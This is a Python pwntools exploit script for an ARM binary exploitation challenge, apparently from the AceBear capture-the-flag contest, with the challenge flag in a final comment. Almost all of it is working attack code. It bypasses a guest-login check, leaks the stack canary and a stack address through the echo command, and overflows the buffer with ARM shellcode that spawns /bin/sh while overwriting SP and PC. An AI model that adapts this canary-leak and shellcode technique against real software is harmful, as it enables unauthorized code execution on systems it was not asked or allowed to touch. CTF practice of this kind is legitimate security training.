from pwn import *
import sys

def arm_exploit(DEBUG="1"):

	def login(username, password):
		r.sendline("2")
		r.recvuntil("Username: ")
		r.sendline(username)
		r.recvuntil("password: ")
		r.sendline(password)
		return r.recvuntil("Your choice: ")
		
	def info():
		r.sendline("1")
		return r.recvuntil("Your choice: ")
		
	def changename(username):
		r.sendline("4")
		r.recvuntil("New username: ")
		r.sendline(username)
		return r.recvuntil("Your choice: ")
		
	def echo(payload):
		r.sendline("3")
		r.recvuntil(":~$")
		r.send(payload)
		if "echo" in payload:
			res=r.recvuntil(payload[4:])
			leak = r.recv(4)
			r.recvuntil(":~$")
			return leak

	def echo2(payload):
		r.send(payload)
		
	if DEBUG=="1":
		r = process(["qemu-arm-static","-g","12345", "./arm-exploit"])
		raw_input("Debug?")
	elif DEBUG=="2":
		r = process(["qemu-arm-static","./arm-exploit"])
		raw_input("Debug?")
	elif DEBUG=="3":
		HOST = "armexploit.acebear.site"
		PORT = 3001
		r = remote(HOST,PORT)
	
	shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x00"
	
	r.recvuntil("Your choice: ")
	login("concavang","concavang") # logined = 1
	
	username = "A"*0x20
	changename(username)
	username = "root"
	changename(username) # isGuestLogin = 0
	
	payload = "echo "
	payload += "C"*0x7c
	canary = u32("\x00"+echo(payload)[:3])
	log.info('canary: %#x' % canary)
	
	payload = "echo "
	payload += "C"*0x7f
	stack = u32(echo(payload))
	log.info('stack: %#x' % stack)
	
	buff = stack-0x84
	log.info('buff: %#x' % buff)
	
	
	payload = "echo "
	payload += "A"*7
	payload += shellcode
	payload += "C"*(0x74-len(shellcode))
	payload += p32(canary)
	payload += p32(buff-0x100) # SP
	payload += p32(buff) # PC
	
	echo2(payload)
	pause()
	echo2("exit\n")
	r.interactive()
	
	
	
	
arm_exploit(sys.argv[1])

# target remote localhost:12345
# AceBear{arm_i5_my_sad_m3m0ry}
